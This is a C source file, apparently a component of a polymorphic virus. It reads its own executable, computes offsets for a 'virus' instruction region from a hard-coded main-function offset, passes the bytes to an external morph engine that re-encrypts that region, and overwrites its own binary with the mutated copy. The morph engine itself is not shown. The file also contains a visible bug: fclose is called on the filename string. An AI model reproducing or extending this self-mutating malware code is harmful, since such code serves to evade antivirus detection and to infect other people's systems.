#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

/* WARNING: Ensure this is updated on every compilation | Defines hex offset of main function */
#define _main_ "0x1240"

char *filename;

extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
int getfilename(int argc, char *argv[]){

	// get the file name from argument
	filename = argv[0];

	return 0;
}

int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
{


	// seed the random number generator
	srand(time(NULL));

	// convert hex value of _main_ offset to unsigned long
	unsigned long main_int =  (int)strtol(_main_, NULL, 16);
	// get base address of executable
	unsigned long base_addr = virus_instruction_begin - main_int;

	// calculate offset of virus_instruction_begin in relative to base address of executable
	virus_instruction_begin = virus_instruction_begin - base_addr;
	// calculate offset of virus_decrypt_offset in relative to base address of executable
	virus_decrypt_offset = virus_decrypt_offset - base_addr;


	FILE *f = fopen(filename, "rb");
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */

	char *string = malloc(fsize + 1);
	if(!string)
	{
			fclose(filename);
			printf("Data allocation failed\n");
			return 1;
	}
	fread(string, 1, fsize, f);
	fclose(f);



	// call the polymorphic engine
	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		printf("Error in polymorphic engine\n");

	}

	// important, remove the file if not the write will fail later on
	remove(filename);


	FILE* out_file = fopen(filename, "wb");
	// write the modified executable data
	fwrite(string, fsize, 1, out_file);
	fclose(out_file);


	free(string);
	return 0;

}